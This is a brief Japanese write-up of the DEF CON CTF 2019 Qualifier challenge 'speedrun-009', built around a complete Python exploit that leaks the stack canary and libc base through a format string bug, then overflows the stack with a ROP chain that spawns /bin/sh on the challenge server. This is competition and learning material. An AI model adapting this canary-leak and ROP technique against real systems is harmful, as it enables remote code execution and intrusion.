# [pwn 5pts] speedrun-009 - DEF CON CTF 2019 Qualifier
64ビットで全部有効です。
```
$ checksec -f speedrun-009
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH	Symbols		FORTIFY	Fortified	Fortifiable  FILE
Full RELRO      Canary found      NX enabled    PIE enabled     No RPATH   No RUNPATH   No Symbols      Yes	0		2	speedrun-009
```
Stack OverflowとFSBがあります。
FSBでいろいろリークしてリターンアドレスを書き換えればOK。

```python
from ptrlib import *

libc = ELF("/lib/x86_64-linux-gnu/libc-2.27.so")
sock = Socket("speedrun-009.quals2019.oooverflow.io", 31337)
#sock = Process("./speedrun-009")

# leak canary
sock.recvuntil("1, 2, or 3\n")
sock.send("2")
payload = b'%163$p.%169$p.'
sock.send(payload)
sock.recvuntil("it \"")
r = sock.recvuntil("\"")
l = r.split(b".")
canary = int(l[0], 16)
addr_libc_start_main_ret = int(l[1], 16)
libc_base = addr_libc_start_main_ret - libc.symbol("__libc_start_main") - 231
dump("canary = " + hex(canary))
dump("libc base = " + hex(libc_base))

# overwrite
sock.recvuntil("1, 2, or 3\n")
sock.send("1")
#payload = b'A' * 0x4d8
payload = b'A' * 0x408
payload += p64(canary)
payload += b'A' * 8
payload += p64(libc_base + 0x000439c7)
payload += p64(59)
payload += p64(libc_base + 0x0002155f)
payload += p64(libc_base + next(libc.find("/bin/sh")))
payload += p64(libc_base + 0x00023e6a)
payload += p64(0)
payload += p64(libc_base + 0x00001b96)
payload += p64(0)
payload += p64(libc_base + 0x000d2975)
#payload += b'A' * (0x5dc - len(payload))
sock.send(payload)

# get the shell!
sock.send("3")

sock.interactive()
```

# 感想
やるだけ問題。
